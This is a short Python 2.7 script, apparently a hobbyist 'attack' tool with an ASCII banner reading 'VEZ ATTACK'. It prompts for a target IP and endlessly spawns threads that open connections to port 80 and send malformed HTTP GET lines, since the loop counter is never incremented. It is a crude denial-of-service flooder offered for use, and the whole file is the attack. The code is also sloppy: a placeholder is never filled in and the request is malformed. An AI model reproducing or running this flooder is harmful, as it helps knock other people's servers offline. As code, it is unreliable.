import time as v
import socket
import threading
print "\n"*1000
v.sleep(2)
print """     \033[1;36;50m                         
 __     __  _____   _____       _      _____   _____      _       ____   _  __
 \ \   / / | ____| |__  /      / \    |_   _| |_   _|    / \     / ___| | |/ /
  \ \ / /  |  _|     / /      / _ \     | |     | |     / _ \   | |     | ' / 
   \ V /   | |___   / /_     / ___ \    | |     | |    / ___ \  | |___  | . \ 
    \_/    |_____| /____|   /_/   \_\   |_|     |_|   /_/   \_\  \____| |_|\_\
                                                                               """
v.sleep(1.5)
print """By VipRs  ______ >>Python2.7               
         |______|                 """
v.sleep(1)
target =raw_input("Ip>>")
port = 80
print "port 80..."
v.sleep(2)
def xxx():
    x = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    x.connect((target, port))
    x.sendto(("GET /{target} HTTP/1.1\rboot off da skid :v\n").encode("ascii"), (target, port))
    x.close()
ix = 0
while ix != 100:
    v.sleep(0.5)
    thread = threading.Thread(target=xxx)
    thread.start()
    print "Socket Sent!"

